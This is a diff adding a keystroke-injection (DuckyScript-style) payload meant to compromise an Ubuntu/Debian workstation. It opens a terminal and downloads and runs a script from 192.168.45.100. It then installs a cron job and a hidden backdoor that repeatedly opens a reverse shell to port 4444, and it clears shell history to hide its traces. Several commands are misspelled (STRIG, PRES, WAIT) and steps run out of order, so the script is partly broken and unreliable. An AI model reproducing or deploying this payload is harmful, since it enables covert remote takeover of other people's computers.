@@ -1,0 +1,48 @@
+REM Payload for Linux system compromise
+REM Target: Ubuntu/Debian workstation
+DELAY 2000
+CTRL-ALT-T
+DELAY 800
+STRIG gnome-terminal --
+DELAY 600
+PRES ENTER
+DELAY 400
+STRING cd /tmp && wget http://192.168.45.100:8080/payload.sh -O setup.sh
+ENTER
+WAIT 1000
+STRING chmod +x setup.sh
+ENTER
+DELAY 500
+STRING bash setup.sh &
+ENTER
+DELAY 300
+STRIG echo '*/5 * * * * /tmp/.hidden/backdoor.sh' | crontab -
+ENTER
+DELAY 400
+STRING mkdir -p /tmp/.hidden
+PRES ENTER
+DELAY 500
+STRING cat > /tmp/.hidden/backdoor.sh << 'EOF'
+ENTER
+DELAY 200
+STRING #!/bin/bash
+ENTER
+STRING while true; do
+ENTER
+STRIG bash -i >& /dev/tcp/192.168.45.100/4444 0>&1
+ENTER
+STRING sleep 300
+ENTER
+STRING done
+ENTER
+STRING EOF
+ENTER
+WAIT 600
+STRING chmod +x /tmp/.hidden/backdoor.sh
+ENTER
+DELAY 400
+STRING nohup /tmp/.hidden/backdoor.sh > /dev/null 2>&1 &
+PRES ENTER
+DELAY 500
+STRIG history -c && exit
+ENTER
